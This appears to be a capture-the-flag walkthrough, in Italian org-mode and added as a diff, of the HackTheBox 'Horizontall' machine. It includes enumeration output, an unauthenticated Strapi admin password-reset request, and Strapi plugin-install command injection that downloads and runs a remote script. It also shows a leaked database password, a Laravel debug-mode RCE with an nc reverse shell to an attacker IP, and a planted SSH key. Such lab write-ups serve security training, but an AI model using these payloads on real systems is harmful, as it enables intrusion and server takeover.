@@ -1,0 +1,268 @@
+#+TITLE: HTB - Horizontall
+#+AUTHOR: Leonardo Tamiano
+
+* Eumeration
+** nmap
+*** leo@kali:~/repos/horizontall$ nmap -sC -sV horizontall
+    #+begin_example
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-12 12:12 CET
+Nmap scan report for horizontall (10.129.155.27)
+Host is up (0.057s latency).
+Not shown: 998 closed tcp ports (conn-refused)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0
+| ssh-hostkey: 
+|   2048 ee:77:41:43:d4:82:bd:3e:6e:6e:50:cd:ff:6b:0d:d5 (RSA)
+|   256 3a:d5:89:d5:da:95:59:d9:df:01:68:37:ca:d5:10:b0 (ECDSA)
+|_  256 4a:00:04:b4:9d:29:e7:af:37:16:1b:4f:80:2d:98:94 (ED25519)
+80/tcp open  http    nginx 1.14.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://horizontall.htb
+|_http-server-header: nginx/1.14.0 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap g/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 9.67 seconds
+    
+    #+end_example
+
+*** leo@kali:~/repos/horizontall$ nmap -p- horizontall
+  #+begin_example
+
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-12 12:12 CET
+Nmap scan report for horizontall (10.129.155.27)
+Host is up (0.055s latency).
+Not shown: 65533 closed tcp ports (conn-refused)
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+Nmap done: 1 IP address (1 host up) scanned in 29.29 seconds
+
+  #+end_example
+** gobuster
+*** gobuster vhost -w ~/repos/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -u http://horizontall.htb 
+    #+begin_example
+ ==============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:          http://horizontall.htb
+[+] Method:       GET
+[+] Threads:      10
+[+] Wordlist:     /home/leo/repos/SecLists/Discovery/DNS/subdomains-top1million-11
+[+] User Agent:   gobuster/3.1.0
+[+] Timeout:      10s
+===============================================================
+2022/03/12 12:23:05 Starting gobuster in VHOST enumeration mode
+===============================================================
+Found: api-prod.horizontall.htb (Status: 200) [Size: 413]
+Progress: 47796 / 114442 (41.76%)                       ^C
+[!] Keyboard interrupt detected, terminating.
+panic: runtime error: invalid memory address or nil pointer dereference
+[signal SIGSEGV: segmentation violation code=0x1 addr=0x0 pc=0x773b15]
+
+goroutine 38 [running]:
+github.com/OJ/gobuster/gobustervhost.(*GobusterVhost).Run(0xc0000122a0, 0xc000286af0, 0x8, 0xc00018a060, 0x1, 0x0)
+        github.com/OJ/gobuster/gobustervhost/gobustervhost.go:125 +0x255
+github.com/OJ/gobuster/libgobuster.(*Gobuster).worker(0xc000012300, 0xc000012cc0, 0xc00001a930)
+        github.com/OJ/gobuster/libgobuster/libgobuster.go:91 +0x1de
+created by github.com/OJ/gobuster/libgobuster.(*Gobuster).Start
+        github.com/OJ/gobuster/libgobuster/libgobuster.go:158 +0x16a
+   
+    #+end_example
+
+** www (80)
+   Di default redirect automatico da ~horizontall~ a ~horizontall.htb~.
+   In un file javascript ho trovato un altro sotto-dominio: ~api-prod.horizontall.htb~.
+
+*** http://horizontall.htb/js/app.c68eb462.js
+    get("http://api-prod.horizontall.htb/reviews")
+
+*** api-prod.horizontall.htb (strapi)
+
+**** version
+     http://api-prod.horizontall.htb/admin/strapiVersion
+
+     #+begin_src js
+{"strapiVersion":"3.0.0-beta.17.4"}     
+     #+end_src
+
+**** leo@kali:~/repos/horizontall$ curl -v http://api-prod.horizontall.htb
+     #+begin_example
+ Trying 10.129.155.27:80...
+ Connected to api-prod.horizontall.htb (10.129.155.27) port 80 (#0)
+> GET / HTTP/1.1
+> Host: api-prod.horizontall.htb
+> User-Agent: curl/7.81.0
+> Accept: */*
+> 
+  Mark bundle as not supporting multiuse
+< HTTP/1.1 200 OK
+< Server: nginx/1.14.0 (Ubuntu)
+< Date: Sat, 12 Mar 2022 11:31:48 GMT
+< Content-Type: text/html; charset=utf-8
+< Content-Length: 413
+< Connection: keep-alive
+< Vary: Origin
+< Content-Security-Policy: img-src 'self' http:; block-all-mixed-content
+< Strict-Transport-Security: max-age=31536000; includeSubDomains
+< X-Frame-Options: SAMEORIGIN
+< X-XSS-Protection: 1; mode=block
+< Last-Modified: Wed, 02 Jun 2021 20:00:29 GMT
+< Cache-Control: max-age=60
+< X-Powered-By: Strapi <strapi.io>     
+     #+end_example
+
+**** leo@kali:~/repos/horizontall$ searchsploit "strapi" -w
+
+     #+begin_example
+(Unauthenticated)                                                                              | https://www.exploit-db.com/exploits/50237
+Strapi 3.0.0-beta.17.7 - Remote Code Execution (RCE) (Authenticated)                           | https://www.exploit-db.com/exploits/50238
+Strapi CMS 3.0.0-beta.17.4 - Remote Code Execution (RCE) (Unauthenticated)                     | https://www.exploit-db.com/exploits/50239
+Strapi CMS 3.0.0-beta.17.4 - Set Password (Unauthenticated) (Metasploit)                       | https://www.exploit-db.com/exploits/50716     
+     #+end_example
+
+**** CVE-2019-18818 (set password Unauthenticated)
+     Ho trovato il seguente script
+
+     https://www.exploit-db.com/exploits/50237
+
+     poi ho visto che la prima POST che fa all'endpoint
+     ~/admin/plugins/users-permissions/auth/reset-password~ non è
+     servito (almeno da quello che ho visto), e l'unica cosa che serve
+     per resettare la password dell'acount admin
+     (admin@horizontall.htb) è una POST all'endpoint
+     ~/admin/auth/reset-password~
+     
+     #+begin_example
+POST /admin/auth/reset-password HTTP/1.1
+Host: api-prod.horizontall.htb
+User-Agent: python-requests/2.20.0
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: close
+Content-Length: 72
+Content-Type: application/json
+
+{"code": {}, "password": "password", "passwordConfirmation": "password"}     
+     #+end_example
+
+     Una volta fatto questo possiamo entrare nell'account ~admin:password~.
+
+**** CVE-2019-19609 (RCE Authenticated)
+     Ho trovato questo script
+     
+     https://www.exploit-db.com/exploits/50238
+
+     e l'ho modificato per fare due richieste POST
+     
+     #+begin_src python
+postData_1 = { "plugin":"documentation && $(curl http://10.10.14.24:1337/python3.py > /tmp/python3.py)" }
+r = s.post(url + "/admin/plugins/install", headers=headersData, data=postData_1, verify=False, proxies=proxies) # SSL == verify=True
+
+postData_2 = { "plugin":"documentation && $(python3 /tmp/python3.py)" }
+r = s.post(url + "/admin/plugins/install", headers=headersData, data=postData_2, verify=False, proxies=proxies) # SSL == verify=True
+     #+end_src
+
+     e così facendo ho spawnato una revshell remota.
+
+* PrivEsc
+
+** strapi@horizontall:~/myapi/config/environments/development$ cat database.json 
+   #+begin_src js
+{
+  "defaultConnection": "default",
+  "connections": {
+    "default": {
+      "connector": "strapi-hook-bookshelf",
+      "settings": {
+        "client": "mysql",
+        "database": "strapi",
+        "host": "127.0.0.1",
+        "port": 3306,
+        "username": "developer",
+        "password": "#J!:F9Zt2u"
+      },
+      "options": {}
+    }
+  }
+}   
+   #+end_src
+
+** mysql
+   #+begin_src sh
+   mysql strapi -h localhost -u developer -p
+   #+end_src
+   
+   Non c'è nulla di utile a quanto pare
+   
+   #+begin_example
+mysql> show tables;
++------------------------------+
+| Tables_in_strapi             |
++------------------------------+
+| core_store                   |
+| reviews                      |
+| strapi_administrator         |
+| upload_file                  |
+| upload_file_morph            |
+| users-permissions_permission |
+| users-permissions_role       |
+| users-permissions_user       |
++------------------------------+
+8 rows in set (0.00 sec)   
+   #+end_example
+** netstat
+*** root@horizontall:/home/developer/myproject# netstat -ltpn
+    #+begin_example
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      1499/nginx: master  
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      1426/sshd           
+tcp        0      0 127.0.0.1:1337          0.0.0.0:*               LISTEN      1963/node /usr/bin/ 
+tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      2926/php7.4         
+tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      1547/mysqld         
+tcp6       0      0 :::80                   :::*                    LISTEN      1499/nginx: master  
+tcp6       0      0 :::22                   :::*                    LISTEN      1426/sshd               
+    #+end_example
+   
+** laravel
+*** CVE-2021-3129 (debug-mode RCE)
+   https://www.ambionics.io/blog/laravel-debug-rce
+   
+   Dato che la versione di laravel era <= v8.4.2 ho utilizzato il
+   seguente script per ottenere una RCE 
+
+   https://www.exploit-db.com/exploits/49424
+   
+   L'unico cambiamento era rispetto alla path contenente il file
+   ~laravel.log~.
+   
+   Al posto di utilizzare la path di default
+   
+   #+begin_example
+   /var/www/html/laravel/storage/logs/laravel.log
+   #+end_example
+   
+   L'idea era di utilizzare la seguente path
+   
+   #+begin_example
+   /home/developer/myproject/storage/logs/laravel.log
+   #+end_example
+
+   Il comando finale per ottenere una rev shell è il seguente
+   
+   #+begin_example
+   python3 laravel_rce.py http://localhost:1337 /home/developer/myproject/storage/logs/laravel.log 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|/bin/nc 10.10.14.24 4444 >/tmp/f'   
+   #+end_example
+
+   dove si suppone l'esistenza di un tunnel SSH creato nel seguente
+   modo dopo aver inserito in ~/opt/strapi/.ssh/authorized_keys~ una
+   chiave pubblica generata con ~ssh-keygen -t rsa~
+   
+   #+begin_example
+   ssh -i strapi -L 1337:localhost:8000 strapi@horizontall
+   #+end_example
+
+* Resources
+  https://www.ambionics.io/blog/laravel-debug-rce
